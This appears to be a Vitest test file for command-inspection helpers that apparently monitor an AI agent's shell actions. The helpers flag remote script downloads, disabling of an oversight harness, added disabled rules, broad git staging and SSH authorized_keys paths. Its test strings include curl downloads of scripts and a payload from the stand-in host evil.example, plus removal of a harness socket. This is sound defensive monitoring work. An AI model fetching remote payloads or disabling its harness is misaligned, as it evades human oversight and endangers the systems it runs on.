import { describe, expect, it } from "vitest";
import {
	commitReferencesPath,
	editAddsDisabledRule,
	isAuthorizedKeysPath,
	parseHarnessDisable,
	parseRemoteScriptDownloads,
} from "./helpers-commands.js";

describe("parseRemoteScriptDownloads — local path precedence", () => {
	it("an explicit -o path wins over a later shell redirect", () => {
		const [d] = parseRemoteScriptDownloads("curl -s https://evil.example/x -o a.sh > b.sh");
		expect(d?.localPath).toBe("a.sh");
	});

	it("an explicit -o path wins over -O basename inference", () => {
		const [d] = parseRemoteScriptDownloads("curl -o a.dat -O https://evil.example/p/x.sh");
		expect(d?.localPath).toBe("a.dat");
	});

	it("a python URL path marks the download as a script", () => {
		const [d] = parseRemoteScriptDownloads("curl https://evil.example/payload.py");
		expect(d?.isScript).toBe(true);
	});
});

describe("parseHarnessDisable — socket and kill targeting", () => {
	it("does not flag removal of a file that merely ends in harness.sock", () => {
		expect(parseHarnessDisable("rm /tmp/myharness.sock")).toBeNull();
	});

	it("flags removal of a path whose final component is exactly harness.sock", () => {
		expect(parseHarnessDisable("rm /repo/.interlinked/harness.sock")).toEqual({
			how: "removed harness socket",
		});
	});

	it("matches the kill target, not the directory of the kill binary", () => {
		expect(parseHarnessDisable("/opt/interlinked/bin/kill 1234")).toBeNull();
	});
});

describe("editAddsDisabledRule — first introduction of the key", () => {
	it("flags adding an empty disabled_rules key where none existed", () => {
		expect(editAddsDisabledRule("rules = {}", "rules = {}\ndisabled_rules = []")).toBe(true);
	});
});

describe("commitReferencesPath — whole-tree staging is add-only for dot / -A", () => {
    it("does not turn an empty quoted path into broad staging", () => {
        expect(commitReferencesPath("git add ''", "src/a.ts")).toBe(false);
        expect(commitReferencesPath("git add '' src/a.ts", "src/a.ts")).toBe(true);
        expect(commitReferencesPath("git add '' src/a.ts", "src/b.ts")).toBe(false);
    });
	it("git commit with a bare '.' path does not count as staging everything", () => {
		expect(commitReferencesPath("git commit -m msg .", "src/a.ts")).toBe(false);
	});

	it("git commit -A (uppercase, not -a) does not count as staging everything", () => {
		expect(commitReferencesPath("git commit -A", "src/a.ts")).toBe(false);
	});

	it("git add . still counts as staging everything", () => {
		expect(commitReferencesPath("git add .", "src/a.ts")).toBe(true);
	});
});

describe("isAuthorizedKeysPath — build directories are fixtures", () => {
	it("rejects a home path that sits under a build directory", () => {
		expect(isAuthorizedKeysPath("~/build/.ssh/authorized_keys")).toBe(false);
	});
});
